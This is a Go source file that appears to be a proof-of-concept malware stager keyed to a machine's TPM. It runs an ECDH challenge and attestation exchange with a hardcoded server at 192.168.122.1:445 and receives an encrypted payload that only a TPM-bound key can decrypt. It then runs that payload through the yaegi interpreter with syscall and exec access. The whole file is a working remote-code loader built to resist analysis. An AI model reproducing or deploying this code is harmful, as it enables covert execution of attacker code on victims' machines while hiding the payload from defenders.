package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/textproto"
	"poc_payload/exec"
	"runtime"

	"github.com/google/go-attestation/attest"
	"github.com/google/go-tpm/legacy/tpm2"
	. "github.com/google/go-tpm/tpm2"
	"github.com/google/go-tpm/tpm2/transport"
	"github.com/google/go-tpm/tpmutil"
	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
	"github.com/traefik/yaegi/stdlib/syscall"
)

var (
	pubKeyBase64    = "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEIqnQpX0arufowZEfxbGaFA+0GTg+pZb86WNqrqAyIADOADEVvq3ehK6W9oybQSQ1ve9e+jyoSrjRU3l1fJBO6A=="
	ip              = "192.168.122.1"
	port            = 445
	encPayloadBytes bytes.Buffer
	payloadBytes    bytes.Buffer
)

func encryptedJsonSend(conn *textproto.Writer, tempCipher cipher.AEAD, data any) error {
	json, err := json.Marshal(data)
	if err != nil {
		return err
	}
	nonce := make([]byte, tempCipher.NonceSize())
	rand.Read(nonce)
	jsonEnc := tempCipher.Seal(nonce, nonce, json, nil)
	dotWriter := conn.DotWriter()
	if _, err = dotWriter.Write(jsonEnc); err != nil {
		return err
	}
	dotWriter.Close()
	return nil
}

func encryptedJsonRead(conn *textproto.Reader, tempCipher cipher.AEAD, data any) error {

	var readBuff bytes.Buffer
	if _, err := readBuff.ReadFrom(conn.DotReader()); err != nil {
		return err
	}

	encryptedJson := bytes.TrimSpace(readBuff.Bytes())
	readBuff.Reset()
	nonce, cipherText := encryptedJson[:tempCipher.NonceSize()], encryptedJson[tempCipher.NonceSize():]
	jsonData, err := tempCipher.Open(nil, nonce, cipherText, nil)
	if err != nil {
		return err
	}
	if err := json.Unmarshal(jsonData, &data); err != nil {
		return err
	}
	return nil
}

type sharedCommandChannel struct {
	io.ReadWriteCloser
}

func (cc sharedCommandChannel) MeasurementLog() ([]byte, error) {
	return []byte{}, nil
}

func main() {
	// Parse server public key
	pubKeyRaw, err := base64.StdEncoding.DecodeString(pubKeyBase64)
	if err != nil {
		log.Panicf("Failed to decode base64: %v", err)
	}
	serverPubKeyInterface, err := x509.ParsePKIXPublicKey(pubKeyRaw)
	if err != nil {
		log.Panicf("Failed to parse pulic key: %v", err)
	}
	serverPubKey := serverPubKeyInterface.(*ecdsa.PublicKey)
	rwc, err := tpm2.OpenTPM()
	if err != nil {
		log.Panic(err)
	}
	defer func() {
		if err := rwc.Close(); err != nil {
			log.Panic(err)
		}
	}()
	thetpm := transport.FromReadWriter(rwc)
	config := &attest.OpenConfig{
		TPMVersion:     attest.TPMVersion20,
		CommandChannel: sharedCommandChannel{rwc},
	}
	tpm, err := attest.OpenTPM(config)
	if err != nil {
		log.Panic(err)
	}
	eks, err := tpm.EKs()
	if err != nil {
		log.Panic(err)
	}
	ek := eks[0]
	akConfig := &attest.AKConfig{}
	ak, err := tpm.NewAK(akConfig)
	if err != nil {
		log.Panic(err)
	}
	attestParams := ak.AttestationParameters()
	if err != nil {
		log.Panic(err)
	}
	tpmPrimary := CreatePrimary{
		PrimaryHandle: TPMRHEndorsement,
		InPublic:      New2B(RSASRKTemplate),
	}

	tpmPrimaryRsp, err := tpmPrimary.Execute(thetpm)
	if err != nil {
		log.Panicf("Error creating primary context: %v", err)
	}

	tpmCreate := CreateLoaded{
		ParentHandle: NamedHandle{
			Handle: tpmPrimaryRsp.ObjectHandle,
			Name:   tpmPrimaryRsp.Name,
		},
		InPublic: New2BTemplate(&TPMTPublic{
			Type:    TPMAlgECC,
			NameAlg: TPMAlgSHA256,
			ObjectAttributes: TPMAObject{
				FixedTPM:             true,
				STClear:              false,
				FixedParent:          true,
				SensitiveDataOrigin:  true,
				UserWithAuth:         true,
				AdminWithPolicy:      false,
				NoDA:                 true,
				EncryptedDuplication: false,
				Restricted:           false,
				Decrypt:              true,
				SignEncrypt:          false,
				X509Sign:             false,
			},
			Parameters: NewTPMUPublicParms(
				TPMAlgECC,
				&TPMSECCParms{
					CurveID: TPMECCNistP256,
					Scheme: TPMTECCScheme{
						Scheme: TPMAlgECDH,
						Details: NewTPMUAsymScheme(
							TPMAlgECDH,
							&TPMSKeySchemeECDH{
								HashAlg: TPMAlgSHA256,
							},
						),
					},
				},
			),
		}),
	}

	tpmCreateRsp, err := tpmCreate.Execute(thetpm)
	if err != nil {
		log.Panic(err)
	}

	outPub, err := tpmCreateRsp.OutPublic.Contents()
	if err != nil {
		log.Panic(err)
	}
	tpmPub, err := outPub.Unique.ECC()
	if err != nil {
		log.Panic(err)
	}
	//	tpmX := big.NewInt(0).SetBytes(tpmPub.X.Buffer)
	//	tpmY := big.NewInt(0).SetBytes(tpmPub.Y.Buffer)

	// Create a SW ECDH key
	swPub := TPMSECCPoint{
		X: TPM2BECCParameter{Buffer: serverPubKey.X.FillBytes(make([]byte, 32))},
		Y: TPM2BECCParameter{Buffer: serverPubKey.Y.FillBytes(make([]byte, 32))},
	}

	// Calculate Z based on TPM priv * SW pub
	ecdh := ECDHZGen{
		KeyHandle: NamedHandle{
			Handle: tpmCreateRsp.ObjectHandle,
			Name:   tpmCreateRsp.Name,
		},
		InPoint: New2B(swPub),
	}
	ecdhRsp, err := ecdh.Execute(thetpm)
	if err != nil {
		log.Fatalf("ECDH_ZGen failed: %v", err)
	}
	outPointTPM, err := ecdhRsp.OutPoint.Contents()
	if err != nil {
		log.Panicf("Unable to get contents of outpoint : %v", err)
	}
	// Flush previous objects
	flushPrimaryContext := FlushContext{
		FlushHandle: tpmPrimaryRsp.ObjectHandle,
	}
	_, err = flushPrimaryContext.Execute(thetpm)
	if err != nil {
		log.Panic(err)
	}
	flushPrimaryContext = FlushContext{
		FlushHandle: tpmCreateRsp.ObjectHandle,
	}
	_, err = flushPrimaryContext.Execute(thetpm)
	if err != nil {
		log.Panic(err)
	}
	// Get random value from TPM
	getRandom := GetRandom{
		BytesRequested: 16,
	}
	getRandomRsp, err := getRandom.Execute(thetpm)
	if err != nil {
		log.Panicf("Unable to get random value: %v", err)
	}
	// Create challenge value
	tempCipherBlock, err := aes.NewCipher(outPointTPM.X.Buffer)
	if err != nil {
		log.Panicf("Error creating cipher: %v", err)
	}
	tempCipher, err := cipher.NewGCM(tempCipherBlock)
	if err != nil {
		log.Panic(err)
	}
	nonce := make([]byte, tempCipher.NonceSize())
	rand.Read(nonce)
	challengeRsp := make([]byte, 16)
	challenge := tempCipher.Seal(nonce, nonce, getRandomRsp.RandomBytes.Buffer, nil)
	// Connect to server
	log.Println("Phase 1")
	conn, err := textproto.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		log.Panicf("Unable to connect to server: %v", err)
	}
	defer func() {
		conn.Close()
	}()
	var dotWriter io.WriteCloser
	// Send Challenge
	challengeData := struct {
		X string `json:"x"`
		Y string `json:"y"`
		C string `json:"c"`
	}{
		X: base64.RawURLEncoding.EncodeToString(tpmPub.X.Buffer),
		Y: base64.RawURLEncoding.EncodeToString(tpmPub.Y.Buffer),
		C: base64.RawURLEncoding.EncodeToString(challenge),
	}
	challengeDataJson, _ := json.Marshal(challengeData)
	dotWriter = conn.DotWriter()
	if _, err := dotWriter.Write(challengeDataJson); err != nil {
		log.Panic(err)
	}
	dotWriter.Close()
	// Receive challenge response
	io.ReadFull(conn.DotReader(), challengeRsp)
	log.Printf("Challenge Resp: %v", challengeRsp)
	if !bytes.Equal(getRandomRsp.RandomBytes.Buffer, challengeRsp) {
		log.Fatalf("Invalid challenge")
	} else {
		log.Println("Valid Challenge, Server verified")
	}
	log.Println("Phase 2")
	// Send ek cert ,ak public and attest params
	var ekCertBytes bytes.Buffer
	// There might not be a certificate stored in nv storage, hence handle the case where it might be stored
	if ek.Certificate != nil {
		ekCertBytes.Read(ek.Certificate.Raw)
	}
	attestData := struct {
		AttestParams *attest.AttestationParameters `json:"attest_params"`
		EkCert       []byte                        `json:"ek_cert"`
		EkUrl        string                        `json:"ek_url"`
		OS           string                        `json:"os"`
	}{
		AttestParams: &attestParams,
		EkCert:       ekCertBytes.Bytes(),
		EkUrl:        ek.CertificateURL,
		OS:           runtime.GOOS,
	}
	if err = encryptedJsonSend(&conn.Writer, tempCipher, attestData); err != nil {
		log.Panic(err)
	}
	encCreds := attest.EncryptedCredential{}
	if err = encryptedJsonRead(&conn.Reader, tempCipher, &encCreds); err != nil {
		log.Panic(err)
	}
	decryptedSecret, err := ak.ActivateCredential(tpm, encCreds)
	if err != nil {
		log.Panic(err)
		return
	}
	decryptedSecretData := struct {
		Secret []byte `json:"secret_data"`
	}{
		Secret: decryptedSecret,
	}
	if err = encryptedJsonSend(&conn.Writer, tempCipher, decryptedSecretData); err != nil {
		log.Panic(err)
	}

	log.Println("Phase 3")
	// Create Binding Key
	tpmPrimary = CreatePrimary{
		PrimaryHandle: TPMRHEndorsement,
		InPublic:      New2B(RSASRKTemplate),
	}

	tpmPrimaryRsp, err = tpmPrimary.Execute(thetpm)
	if err != nil {
		log.Panicf("Error creating primary context: %v", err)
	}
	createBindingKey := CreateLoaded{
		ParentHandle: NamedHandle{
			Handle: tpmPrimaryRsp.ObjectHandle,
			Name:   tpmPrimaryRsp.Name,
		},
		InPublic: New2BTemplate(&TPMTPublic{
			Type:    TPMAlgRSA,
			NameAlg: TPMAlgSHA256,
			ObjectAttributes: TPMAObject{
				FixedTPM:             true,
				STClear:              false,
				FixedParent:          true,
				SensitiveDataOrigin:  true,
				UserWithAuth:         true,
				AdminWithPolicy:      false,
				NoDA:                 true,
				EncryptedDuplication: false,
				Restricted:           false,
				Decrypt:              true,
				SignEncrypt:          false,
			},
			Parameters: NewTPMUPublicParms(
				TPMAlgRSA,
				&TPMSRSAParms{
					Scheme: TPMTRSAScheme{
						Scheme: TPMAlgOAEP,
						Details: NewTPMUAsymScheme(
							TPMAlgOAEP,
							&TPMSEncSchemeOAEP{
								HashAlg: TPMAlgSHA256,
							},
						),
					},
					KeyBits: 2048,
				}),
		}),
	}

	createBindingKeyRsp, err := createBindingKey.Execute(thetpm)
	if err != nil {
		log.Panic(err)
	}
	flushPrimaryContext = FlushContext{
		FlushHandle: tpmPrimaryRsp.ObjectHandle,
	}
	_, err = flushPrimaryContext.Execute(thetpm)
	if err != nil {
		log.Panic(err)
	}
	certifyBindingKey, err := ak.Certify(tpm, tpmutil.Handle(createBindingKeyRsp.ObjectHandle.HandleValue()))
	if err != nil {
		log.Panic(err)
	}
	if err = encryptedJsonSend(&conn.Writer, tempCipher, certifyBindingKey); err != nil {
		log.Panic(err)
	}
	encPayloadData := struct {
		EncPayload []byte `json:"enc_payload"`
	}{}

	log.Println("Phase 4")
	if err = encryptedJsonRead(&conn.Reader, tempCipher, &encPayloadData); err != nil {
		log.Panic(err)
	}
	encPayloadBytes.Write(encPayloadData.EncPayload)
	for encPayloadBytes.Len() > 0 {
		payloadBlock, err := tpm2.RSADecrypt(rwc, tpmutil.Handle(createBindingKeyRsp.ObjectHandle), "", encPayloadBytes.Next(256), &tpm2.AsymScheme{
			Alg: tpm2.AlgOAEP, Hash: tpm2.AlgSHA256}, "")
		if err != nil {
			log.Panic(err)
		}
		payloadBytes.Write(payloadBlock)

	}

	payload, err := base64.StdEncoding.DecodeString(payloadBytes.String())
	if err != nil {
		log.Panic(err)
	}
	i := interp.New(interp.Options{})

	i.Use(stdlib.Symbols)
	i.Use(syscall.Symbols)
	i.Use(exec.Symbols)
	_, err = i.Eval(string(payload))
	if err != nil {
		log.Panic(err)
	}

}
